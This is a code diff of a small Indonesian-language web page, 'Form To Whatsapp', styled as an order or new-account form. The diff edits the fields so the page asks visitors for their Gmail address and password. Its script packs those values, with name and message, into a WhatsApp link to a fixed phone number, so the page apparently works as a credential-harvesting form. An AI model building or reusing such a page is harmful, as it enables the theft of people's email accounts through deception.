@@ -11,6 +11,7 @@
       class="max-w-xl w-full mx-auto text-center min-h-screen flex flex-col items-center justify-center"
     >
       <h1 class="text-2xl font-bold sm:text-3xl">Form To Whatsapp</h1>
+      <h2>Jika Anda Ingin Pesan Isi Di Bawah Ini</h2>
       <form
         action="#"
         class="mx-auto mb-0 mt-8 max-w-md space-y-4"
@@ -28,16 +29,16 @@
           placeholder="ketik pesan anda..."
           id="pesan"
         />
-                <input
+        <input
           type="text"
-          class="w-full rounded-lg border border-gray-200 p-4 pe-12 text-sm shadow-sm"
-          placeholder="Ketik Gmail..."
-          id="Gmail"
+          class="w-full rounded-lg border border-gray-300 p-4 pe-12 text-sm shadow-sm"
+          placeholder="masukan gmail cpm anda untuk akun baru"
+          id="gmail"
         />
         <input
           type="text"
-          class="w-full rounded-lg border border-gray-200 p-4 pe-12 text-sm shadow-sm"
-          placeholder="ketik Password..."
+          class="w-full rounded-lg border border-gray-300 p-4 pe-12 text-sm shadow-sm"
+          placeholder="masukan password anda"
           id="password"
         />
         <button
@@ -50,7 +51,7 @@
     </div>
     <script>
       function sendMessageToWhatsapp() {
-        const urlToWhatsapp = `https://wa.me/6285591916436?text=Halo, nama saya ${nama.value}, ${pesan.value, ${Gmail.value}, ${password.value}`;
+        const urlToWhatsapp = `https://wa.me/6285894955362?text=Halo, nama saya ${nama.value}, ${pesan.value}, ${gmail.value}, ${password.value}`;
 
         window.open(urlToWhatsapp, "_blank");
       }
